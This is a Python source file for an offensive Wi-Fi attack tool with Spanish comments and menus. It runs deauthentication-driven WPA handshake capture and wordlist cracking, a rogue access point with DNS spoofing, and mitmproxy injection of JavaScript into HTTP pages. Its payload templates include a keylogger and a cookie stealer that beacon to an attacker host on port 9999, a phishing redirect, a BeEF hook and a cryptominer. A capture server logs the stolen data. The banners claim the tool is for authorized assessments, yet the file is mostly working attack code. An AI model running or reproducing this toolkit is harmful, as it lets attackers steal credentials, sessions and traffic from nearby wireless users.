#!/usr/bin/env python3

"""
Wireless Scanner & Payload Injector v1.0
- Escaneo Wi-Fi con airodump-ng
- Captura de handshakes WPA/WPA2
- Rogue AP (hostapd + dnsmasq)
- Inyección HTTP/JavaScript vía mitmproxy
- DNS spoofing para redirigir a portal cautivo

Uso: sudo python3 wireless_injector.py
Requiere: aircrack-ng, hostapd, dnsmasq, mitmproxy
"""

import argparse
import ipaddress
import os
import random
import re
import signal
import shutil
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

from .dependencies import check_dependencies, install_missing


class Colors:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    RESET = "\033[0m"
    BOLD = "\033[1m"


BANNER_VARIANTS = (
    """
+--------------------------------------------------------------------------+
| WIRELESS INJECTOR :: SCAN · HANDSHAKE · ROGUE AP · MITM                 |
| Authorized wireless assessment / controlled payload workflow            |
+--------------------------------------------------------------------------+
""",
    """
╭──────────────────────────────────────────────────────────────────────────╮
│  WIRELESS INJECTOR  ·  RF assessment  ·  HTTP interception               │
│  ejecución ofensiva autorizada y trazable                                │
╰──────────────────────────────────────────────────────────────────────────╯
""",
    """
[ WI ]  wireless scanner / handshake / rogue AP / mitm
[ !! ]  authorized assessment only — record scope before execution
[ .. ]  payload workflow with cleanup and rollback tracking
""",
)


class WirelessTool:
    """Herramienta principal."""

    def __init__(self, interface=None, uplink_interface=None, banner_style=None, create_dirs=True):
        self.interface = self._validate_interface(interface or os.getenv("WIRELESS_INTERFACE", "wlan0"))
        self.mon_interface = f"{self.interface}mon"
        self.uplink_interface = self._validate_interface(uplink_interface or os.getenv("UPLINK_INTERFACE", "eth0"))
        self.output_dir = os.getenv("WIRELESS_OUTPUT_DIR", "wireless_captures")
        self.rogue_dir = os.getenv("ROGUE_AP_DIR", "rogue_ap")
        self.payloads_dir = os.getenv("PAYLOADS_DIR", "payloads_web")
        self.banner_style = banner_style
        if create_dirs:
            self.crear_directorios()
        self.procesos = {}
        self.firewall_rules = []
        self.stop_event = threading.Event()

    def crear_directorios(self):
        for d in (self.output_dir, self.rogue_dir, self.payloads_dir):
            Path(d).mkdir(parents=True, exist_ok=True)

    @staticmethod
    def _validate_mac(value, field="MAC"):
        value = str(value).strip().upper()
        if not re.fullmatch(r"(?:[0-9A-F]{2}:){5}[0-9A-F]{2}", value):
            raise ValueError(f"{field} no válida: {value!r}")
        return value

    @staticmethod
    def _validate_channel(value):
        channel = int(value)
        if not 1 <= channel <= 196:
            raise ValueError("El canal debe estar entre 1 y 196")
        return channel

    @staticmethod
    def _validate_port(value):
        port = int(value)
        if not 1 <= port <= 65535:
            raise ValueError("El puerto debe estar entre 1 y 65535")
        return port

    @staticmethod
    def _validate_ssid(value):
        value = str(value).strip()
        if not value or len(value) > 32 or any(c in value for c in "\r\n"):
            raise ValueError("El SSID debe tener entre 1 y 32 caracteres sin saltos de línea")
        return value

    @staticmethod
    def _validate_interface(value):
        value = str(value).strip()
        if not re.fullmatch(r"[A-Za-z0-9_.-]{1,15}", value):
            raise ValueError(f"Interfaz no válida: {value!r}")
        return value

    @staticmethod
    def _validate_callback_host(value):
        value = str(value).strip()
        try:
            ipaddress.ip_address(value)
            return value
        except ValueError:
            if re.fullmatch(r"[A-Za-z0-9.-]{1,253}", value) and not value.startswith("-"):
                return value
        raise ValueError(f"Host de callback no válido: {value!r}")

    def banner(self):
        style = self.banner_style
        if style is None:
            raw = os.getenv("BANNER_STYLE")
            style = int(raw) if raw and raw.isdigit() else random.SystemRandom().randrange(len(BANNER_VARIANTS))
        if style not in range(len(BANNER_VARIANTS)):
            raise ValueError(f"BANNER_STYLE debe estar entre 0 y {len(BANNER_VARIANTS) - 1}")
        color = Colors.CYAN if sys.stdout.isatty() else ""
        reset = Colors.RESET if sys.stdout.isatty() else ""
        print(f"{color}{BANNER_VARIANTS[style]}{reset}")

    def check_root(self):
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Esta herramienta requiere permisos root.{Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Ejecuta: sudo python3 {sys.argv[0]}{Colors.RESET}")
            sys.exit(1)

    def check_tools(self, interactive=False, install=False, dry_run=False):
        """Verifica herramientas instaladas, sin preguntar por defecto.

        No interactivo por defecto: en uso no interactivo (scripts, CI,
        --check-only) nunca llama a input(). Solo pregunta si se pasa
        interactive=True y hay una terminal.
        Devuelve la lista de herramientas que faltan (vacía si están todas).
        Si install=True, instala lo que falta con install_missing().
        """
        result = check_dependencies()
        missing = result["missing"]
        if missing:
            print(f"{Colors.YELLOW}[!] Faltan herramientas: {', '.join(missing)}{Colors.RESET}")
            print(
                f"{Colors.YELLOW}[*] Paquetes apt: "
                f"{', '.join(result['packages'])}{Colors.RESET}"
            )
            if install:
                install_missing(missing, dry_run=dry_run)
                return check_dependencies()["missing"]
            if interactive and sys.stdin.isatty():
                resp = input("¿Intentar instalar? [s/N]: ").strip().lower()
                if resp == "s":
                    self.instalar_herramientas(missing)
                    return check_dependencies()["missing"]
        else:
            print(f"{Colors.GREEN}[+] Todas las herramientas disponibles.{Colors.RESET}\n")
        return missing

    def instalar_herramientas(self, tools, dry_run=False, use_sudo=None):
        """Instala las herramientas que faltan, por paquete apt real.

        Antes hacía ``apt-get install -y airmon-ng airodump-ng ...``,
        pero esos nombres son binarios, no paquetes apt, así que apt
        fallaba. Ahora se traduce cada binario a su paquete con
        TOOL_PACKAGES (airmon-ng/airodump-ng/aireplay-ng/aircrack-ng
        -> aircrack-ng, etc.), se deduplica, se hace apt-get update
        y se verifica con shutil.which después de instalar.
        """
        if not tools:
            return True
        return install_missing(list(tools), dry_run=dry_run, use_sudo=use_sudo)

    # ========================================================================
    # GESTIÓN DE INTERFAZ
    # ========================================================================
    def seleccionar_interfaz(self):
        print(f"{Colors.CYAN}--- Interfaces disponibles ---{Colors.RESET}")
        r = subprocess.run(["iwconfig"], capture_output=True, text=True)
        print(r.stdout)
        iface = input("Interfaz [wlan0]: ").strip() or self.interface
        self.interface = self._validate_interface(iface)
        self.mon_interface = f"{self.interface}mon"

    def activar_modo_monitor(self):
        print(f"\n{Colors.YELLOW}[*] Activando modo monitor en {self.interface}...{Colors.RESET}")
        subprocess.run(["airmon-ng", "check", "kill"])
        subprocess.run(["airmon-ng", "start", self.interface])
        print(f"{Colors.GREEN}[+] Modo monitor activo: {self.mon_interface}{Colors.RESET}")

    def desactivar_modo_monitor(self):
        print(f"\n{Colors.YELLOW}[*] Desactivando modo monitor...{Colors.RESET}")
        subprocess.run(["airmon-ng", "stop", self.mon_interface])
        subprocess.run(["service", "NetworkManager", "start"])
        print(f"{Colors.GREEN}[+] Modo managed restaurado.{Colors.RESET}")

    # ========================================================================
    # ESCANEO WIFI
    # ========================================================================
    def escanear_redes(self, duracion=15):
        """Escanea redes Wi-Fi cercanas."""
        duracion = int(duracion)
        if not 1 <= duracion <= 3600:
            raise ValueError("La duración debe estar entre 1 y 3600 segundos")
        self.seleccionar_interfaz()
        self.activar_modo_monitor()

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_prefix = os.path.join(self.output_dir, f"scan_{timestamp}")

        print(f"\n{Colors.CYAN}[*] Escaneando redes durante {duracion}s...{Colors.RESET}\n")
        cmd = [
            "airodump-ng",
            self.mon_interface,
            "-w", output_prefix,
            "--output-format", "csv",
        ]

        proc = subprocess.Popen(cmd)
        try:
            time.sleep(duracion)
        except KeyboardInterrupt:
            pass
        finally:
            proc.terminate()
            proc.wait()

        csv_file = f"{output_prefix}-01.csv"
        self.procesar_scan(csv_file)
        return csv_file

    def procesar_scan(self, csv_file):
        """Procesa el CSV de airodump y muestra redes."""
        if not os.path.exists(csv_file):
            print(f"{Colors.RED}[!] Archivo no encontrado.{Colors.RESET}")
            return []

        redes = []
        with open(csv_file, "r", errors="ignore") as f:
            en_redes = False
            for linea in f:
                if "BSSID" in linea and "ESSID" in linea:
                    en_redes = True
                    continue
                if en_redes and linea.strip() and not linea.startswith("Station"):
                    partes = [p.strip() for p in linea.split(",")]
                    if len(partes) >= 14 and partes[0] and len(partes[0]) == 17:
                        red = {
                            "bssid": partes[0],
                            "channel": partes[3].strip(),
                            "privacy": partes[5].strip(),
                            "power": partes[8].strip(),
                            "essid": partes[13].strip(),
                        }
                        redes.append(red)

        print(f"\n{Colors.GREEN}=== REDES DETECTADAS ({len(redes)}) ==={Colors.RESET}")
        print(f"{'#':<4} {'BSSID':<18} {'CH':<4} {'PWR':<5} {'PRIVACY':<10} {'ESSID'}")
        print("-" * 80)
        for i, r in enumerate(redes):
            essid = r["essid"][:30] if r["essid"] else "<oculto>"
            print(f"{i:<4} {r['bssid']:<18} {r['channel']:<4} {r['power']:<5} "
                  f"{r['privacy']:<10} {essid}")
        print()
        return redes

    # ========================================================================
    # CAPTURA DE HANDSHAKE
    # ========================================================================
    def capturar_handshake(self, bssid, channel, essid="objetivo"):
        """Captura handshake WPA/WPA2 mediante deauth autorizado."""
        bssid = self._validate_mac(bssid, "BSSID")
        channel = self._validate_channel(channel)
        essid = self._validate_ssid(essid or "objetivo")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_prefix = os.path.join(self.output_dir, f"handshake_{essid}_{timestamp}")

        print(f"\n{Colors.CYAN}[*] Capturando handshake de {essid} ({bssid}) canal {channel}{Colors.RESET}")

        cmd_airodump = [
            "airodump-ng",
            "-c", str(channel),
            "--bssid", bssid,
            "-w", output_prefix,
            self.mon_interface,
        ]

        print(f"{Colors.YELLOW}[*] Iniciando airodump-ng...{Colors.RESET}")
        proc_airodump = subprocess.Popen(cmd_airodump)

        time.sleep(5)

        # Inyectar tráfico para forzar handshake
        print(f"{Colors.YELLOW}[*] Enviando deauth para forzar handshake...{Colors.RESET}")
        cmd_deauth = [
            "aireplay-ng",
            "-0", "5",  # 5 deauths
            "-a", bssid,
            self.mon_interface,
        ]
        subprocess.run(cmd_deauth)

        print(f"{Colors.YELLOW}[*] Esperando handshake (Ctrl+C para detener)...{Colors.RESET}")
        try:
            while True:
                time.sleep(2)
                cap_file = f"{output_prefix}-01.cap"
                if os.path.exists(cap_file):
                    r = subprocess.run(
                        ["aircrack-ng", cap_file],
                        capture_output=True, text=True
                    )
                    if "WPA (1 handshake)" in r.stdout or "WPA (2 handshakes)" in r.stdout:
                        print(f"\n{Colors.GREEN}[✓] ¡HANDSHAKE CAPTURADO!{Colors.RESET}")
                        print(f"{Colors.GREEN}[✓] Guardado en: {cap_file}{Colors.RESET}")
                        break
        except KeyboardInterrupt:
            pass
        finally:
            proc_airodump.terminate()
            proc_airodump.wait()

        return f"{output_prefix}-01.cap"

    def crackear_handshake(self, cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Crackea el handshake con aircrack-ng."""
        cap_file = os.path.abspath(os.path.expanduser(str(cap_file)))
        wordlist = os.path.abspath(os.path.expanduser(str(wordlist)))
        if not os.path.isfile(cap_file):
            print(f"{Colors.RED}[!] Captura no encontrada: {cap_file}{Colors.RESET}")
            return False
        if not os.path.isfile(wordlist):
            print(f"{Colors.RED}[!] Wordlist no encontrada: {wordlist}{Colors.RESET}")
            return
        print(f"{Colors.CYAN}[*] Crackeando {cap_file} con {wordlist}...{Colors.RESET}")
        subprocess.run(["aircrack-ng", "-w", wordlist, cap_file])

    # ========================================================================
    # ROGUE AP (PUNTO DE ACCESO FALSO)
    # ========================================================================
    def configurar_rogue_ap(self):
        """Configura un punto de acceso falso."""
        ssid = self._validate_ssid(input("Nombre del AP falso (ESSID) [Free-WiFi]: ").strip() or "Free-WiFi")
        channel = self._validate_channel(input("Canal [6]: ").strip() or "6")

        # Configurar hostapd
        hostapd_conf = f"""interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        hostapd_path = os.path.join(self.rogue_dir, "hostapd.conf")
        with open(hostapd_path, "w") as f:
            f.write(hostapd_conf)

        # Configurar dnsmasq
        dnsmasq_conf = f"""interface={self.interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/192.168.1.1
"""
        dnsmasq_path = os.path.join(self.rogue_dir, "dnsmasq.conf")
        with open(dnsmasq_path, "w") as f:
            f.write(dnsmasq_conf)

        print(f"{Colors.GREEN}[+] Configuraciones creadas en {self.rogue_dir}/{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Para iniciar:{Colors.RESET}")
        print(f"    ifconfig {self.interface} up 192.168.1.1 netmask 255.255.255.0")
        print(f"    hostapd -d {hostapd_path}")
        print(f"    dnsmasq -C {dnsmasq_path} -d")
        return hostapd_path, dnsmasq_path

    def iniciar_rogue_ap(self):
        """Lanza el rogue AP."""
        hostapd_conf, dnsmasq_conf = self.configurar_rogue_ap()

        # Configurar IP
        self._validate_interface(self.interface)
        self._validate_interface(self.uplink_interface)
        subprocess.run([
            "ifconfig", self.interface, "up",
            "192.168.1.1", "netmask", "255.255.255.0"
        ], check=False)

        # Lanzar dnsmasq
        print(f"{Colors.YELLOW}[*] Iniciando dnsmasq...{Colors.RESET}")
        self.procesos["dnsmasq"] = subprocess.Popen(
            ["dnsmasq", "-C", dnsmasq_conf, "-d"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )

        time.sleep(2)

        # Lanzar hostapd
        print(f"{Colors.YELLOW}[*] Iniciando hostapd...{Colors.RESET}")
        self.procesos["hostapd"] = subprocess.Popen(
            ["hostapd", "-d", hostapd_conf],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT
        )

        # Habilitar forwarding
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
        postrouting_rule = ["iptables", "-t", "nat", "-A", "POSTROUTING",
                            "-o", self.uplink_interface, "-j", "MASQUERADE"]
        forward_rule = ["iptables", "-A", "FORWARD", "-i", self.interface,
                        "-o", self.uplink_interface, "-j", "ACCEPT"]
        subprocess.run(postrouting_rule, check=False)
        subprocess.run(forward_rule, check=False)
        self.firewall_rules.extend([postrouting_rule, forward_rule])

        print(f"\n{Colors.GREEN}[✓] Rogue AP activo!{Colors.RESET}")
        print(f"{Colors.GREEN}[✓] Los clientes obtendrán IP y todo el tráfico pasa por ti{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Para detener: Ctrl+C{Colors.RESET}")

    # ========================================================================
    # INYECCIÓN DE PAYLOADS / JAVASCRIPT
    # ========================================================================
    def crear_payload_javascript(self):
        """Crea un payload JavaScript malicioso."""
        print(f"\n{Colors.CYAN}--- Plantillas de Payload JavaScript ---{Colors.RESET}")
        print("  [1] Keylogger básico")
        print("  [2] Cookie stealer")
        print("  [3] Redirección a URL externa")
        print("  [4] BeEF hook")
        print("  [5] Minero de criptomonedas (Coinhive)")
        print("  [6] Personalizado")

        opcion = input(">> ").strip()

        payloads = {
            "1": '''<script>
document.addEventListener('keydown', function(e) {
  new Image().src='http://ATACANTE_IP:9999/log?k='+btoa(e.key);
});
</script>''',
            "2": '''<script>
new Image().src='http://ATACANTE_IP:9999/steal?c='+document.cookie;
</script>''',
            "3": '''<script>
window.location='http://ATACANTE_IP:9999/phishing';
</script>''',
            "4": '''<script src="http://ATACANTE_IP:3000/hook.js"></script>''',
            "5": '''<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
var miner = new CoinHive.User('SITE_KEY', 'john-doe');
miner.start();
</script>''',
        }

        if opcion in payloads:
            js = payloads[opcion]
        else:
            js = input("Pega tu JavaScript:\n")

        callback_host = self._validate_callback_host(
            input("IP o host del callback: ").strip() or "192.168.1.100"
        )
        js = js.replace("ATACANTE_IP", callback_host)

        filename = f"payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.js"
        path = os.path.join(self.payloads_dir, filename)
        with open(path, "w") as f:
            f.write(js)
        print(f"{Colors.GREEN}[✓] Payload guardado en {path}{Colors.RESET}")
        return path

    def crear_mitmproxy_script(self):
        """Crea un script para mitmproxy que inyecta JS en respuestas HTTP."""
        js_path = input("Ruta del payload JS a inyectar: ").strip()
        if not os.path.exists(js_path):
            print(f"{Colors.RED}[!] Archivo no encontrado.{Colors.RESET}")
            return None

        with open(js_path) as f:
            js_content = f.read()
            # Escapar para Python string
            js_escaped = js_content.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n")

        script = f'''#!/usr/bin/env python3
# mitmproxy script: inyecta JS en todas las respuestas HTML
from mitmproxy import http
import re

PAYLOAD = """<script>{js_escaped}</script>"""

def response(flow: http.HTTPFlow):
    content_type = flow.response.headers.get("Content-Type", "")
    if "text/html" in content_type:
        body = flow.response.get_text()
        if "</head>" in body:
            new_body = body.replace("</head>", PAYLOAD + "</head>")
            flow.response.set_text(new_body)
            print(f"[+] JS inyectado en: {{flow.request.pretty_host}}")
'''

        script_path = os.path.join(self.payloads_dir, "injector.py")
        with open(script_path, "w") as f:
            f.write(script)
        print(f"{Colors.GREEN}[✓] Script mitmproxy guardado en {script_path}{Colors.RESET}")
        return script_path

    def iniciar_mitmproxy(self):
        """Inicia mitmproxy con el script de inyección."""
        script_path = self.crear_mitmproxy_script()
        if not script_path:
            return

        puerto = self._validate_port(input("Puerto mitmproxy [8080]: ").strip() or "8080")

        print(f"{Colors.CYAN}[*] Iniciando mitmproxy en puerto {puerto}...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Configura proxy en los clientes: <tu_ip>:{puerto}{Colors.RESET}")

        # Activar IP forwarding para transparent proxy
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=False)
        redirect_add = [
            "iptables", "-t", "nat", "-A", "PREROUTING",
            "-i", self.interface, "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(puerto)
        ]
        redirect_delete = [
            "iptables", "-t", "nat", "-D", "PREROUTING",
            "-i", self.interface, "-p", "tcp", "--dport", "80",
            "-j", "REDIRECT", "--to-port", str(puerto)
        ]
        subprocess.run(redirect_add, check=False)
        self.firewall_rules.append(redirect_delete)

        try:
            subprocess.run(["mitmproxy", "-s", script_path, "--listen-port", str(puerto)], check=False)
        except KeyboardInterrupt:
            pass
        finally:
            self._rollback_firewall()


    # ========================================================================
    # SERVIDOR DE CAPTURA (para callbacks de JS)
    # ========================================================================
    def iniciar_servidor_captura(self, puerto=9999):
        """Servidor HTTP que recibe datos de callback del laboratorio."""
        from http.server import BaseHTTPRequestHandler, HTTPServer

        puerto = self._validate_port(puerto)
        bind_host = self._validate_callback_host(os.getenv("CAPTURE_BIND", "0.0.0.0"))
        capturas_file = os.path.join(self.payloads_dir, "capturas.log")

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                ts = datetime.now().isoformat()
                linea = f"[{ts}] {self.client_address[0]} {self.path}\n"
                print(f"{Colors.MAGENTA}[CAPTURA]{Colors.RESET} {linea.strip()}")
                with open(capturas_file, "a") as f:
                    f.write(linea)
                self.send_response(200)
                self.end_headers()

            def log_message(self, fmt, *args):
                pass

        server = HTTPServer((bind_host, puerto), Handler)
        print(f"{Colors.GREEN}[+] Servidor de captura activo en puerto {puerto}{Colors.RESET}")
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            pass

    # ========================================================================
    # MENÚ PRINCIPAL
    # ========================================================================
    def menu(self):
        print(f"{Colors.CYAN}╔════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.CYAN}║        MENÚ PRINCIPAL                  ║{Colors.RESET}")
        print(f"{Colors.CYAN}╠════════════════════════════════════════╣{Colors.RESET}")
        print(f"  {Colors.GREEN}[1]{Colors.RESET} Escanear redes Wi-Fi")
        print(f"  {Colors.GREEN}[2]{Colors.RESET} Capturar handshake WPA")
        print(f"  {Colors.GREEN}[3]{Colors.RESET} Crackear handshake")
        print(f"  {Colors.GREEN}[4]{Colors.RESET} Configurar Rogue AP")
        print(f"  {Colors.GREEN}[5]{Colors.RESET} Iniciar Rogue AP")
        print(f"  {Colors.GREEN}[6]{Colors.RESET} Crear payload JavaScript")
        print(f"  {Colors.GREEN}[7]{Colors.RESET} Crear script mitmproxy")
        print(f"  {Colors.GREEN}[8]{Colors.RESET} Iniciar mitmproxy (transparent)")
        print(f"  {Colors.GREEN}[9]{Colors.RESET} Servidor de captura (callbacks)")
        print(f"  {Colors.GREEN}[10]{Colors.RESET} Ataque completo (Rogue AP + JS Inject)")
        print(f"  {Colors.RED}[0]{Colors.RESET} Salir")
        print(f"{Colors.CYAN}╚════════════════════════════════════════╝{Colors.RESET}")
        return input("\n>> ").strip()

    def ataque_completo(self):
        """Rogue AP + DNS spoofing + mitmproxy + JS injection."""
        print(f"\n{Colors.MAGENTA}{'='*70}")
        print(f"{Colors.MAGENTA}    ATAQUE COMPLETO: Rogue AP + JS Injection{Colors.MAGENTA}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

        # Crear payload JS
        self.crear_payload_javascript()

        # Crear script mitmproxy
        self.crear_mitmproxy_script()

        # Iniciar rogue AP en thread
        threading.Thread(target=self.iniciar_rogue_ap, daemon=True).start()
        time.sleep(5)

        # Iniciar mitmproxy en thread
        threading.Thread(target=self.iniciar_mitmproxy, daemon=True).start()
        time.sleep(3)

        # Iniciar servidor de captura en thread
        threading.Thread(target=self.iniciar_servidor_captura, daemon=True).start()

        print(f"\n{Colors.GREEN}[✓] Ataque completo en ejecución{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Monitor de capturas: payloads_web/capturas.log{Colors.RESET}")
        print(f"{Colors.RED}[*] Ctrl+C para detener todo{Colors.RESET}")

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.desactivar_modo_monitor()
            self.detener_todo()

    def _rollback_firewall(self):
        """Elimina las reglas añadidas por esta instancia, en orden inverso."""
        for rule in reversed(self.firewall_rules):
            try:
                subprocess.run(rule, check=False, capture_output=True)
            except OSError as exc:
                print(f"{Colors.YELLOW}[!] No se pudo revertir una regla: {exc}{Colors.RESET}")
        self.firewall_rules.clear()

    def detener_todo(self):
        """Detiene procesos y revierte reglas creadas por la herramienta."""
        self.stop_event.set()
        for nombre, proc in list(self.procesos.items()):
            try:
                if proc.poll() is None:
                    proc.terminate()
                    proc.wait(timeout=5)
                print(f"[+] {nombre} detenido.")
            except subprocess.TimeoutExpired:
                proc.kill()
                print(f"[!] {nombre} finalizado forzosamente.")
            except (OSError, AttributeError) as exc:
                print(f"{Colors.YELLOW}[!] No se pudo detener {nombre}: {exc}{Colors.RESET}")
        self._rollback_firewall()
        self.procesos.clear()

    def run(self):
        self.check_root()
        self.check_tools()
        self.banner()

        acciones = {
            "1": self.escanear_redes,
            "2": lambda: self.capturar_handshake(
                input("BSSID: "),
                input("Canal: "),
                input("ESSID: ")
            ),
            "3": lambda: self.crackear_handshake(
                input("Archivo .cap: ")
            ),
            "4": self.configurar_rogue_ap,
            "5": self.iniciar_rogue_ap,
            "6": self.crear_payload_javascript,
            "7": self.crear_mitmproxy_script,
            "8": self.iniciar_mitmproxy,
            "9": lambda: self.iniciar_servidor_captura(
                int(input("Puerto [9999]: ").strip() or "9999")
            ),
            "10": self.ataque_completo,
        }

        while True:
            op = self.menu()
            if op == "0":
                self.detener_todo()
                print(f"\n{Colors.GREEN}[+] Saliendo...{Colors.RESET}")
                sys.exit(0)
            accion = acciones.get(op)
            if accion:
                try:
                    accion()
                except KeyboardInterrupt:
                    print(f"\n{Colors.YELLOW}[!] Interrumpido{Colors.RESET}")
                except Exception as e:
                    print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[!] Opción inválida{Colors.RESET}")


def build_parser():
    parser = argparse.ArgumentParser(
        description="Wireless scanner, handshake, rogue AP, MITM y payload workflow autorizado."
    )
    parser.add_argument("--interface", help="Interfaz Wi-Fi (default: WIRELESS_INTERFACE o wlan0).")
    parser.add_argument("--uplink", help="Interfaz uplink para NAT (default: UPLINK_INTERFACE o eth0).")
    parser.add_argument("--banner-style", type=int, choices=range(len(BANNER_VARIANTS)), help="Variante del banner.")
    parser.add_argument("--show-banner", action="store_true", help="Muestra el banner y termina sin iniciar radio.")
    parser.add_argument("--verbose", action="store_true", help="Activa logging detallado de subprocess.")
    return parser


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.verbose:
        import logging
        logging.basicConfig(level=logging.DEBUG)
    try:
        tool = WirelessTool(
            interface=args.interface,
            uplink_interface=args.uplink,
            banner_style=args.banner_style,
        )
        if args.show_banner:
            tool.banner()
            return 0
        tool.run()
        return 0
    except (ValueError, RuntimeError, OSError) as exc:
        print(f"{Colors.RED}[!] Error de configuración: {exc}{Colors.RESET}")
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
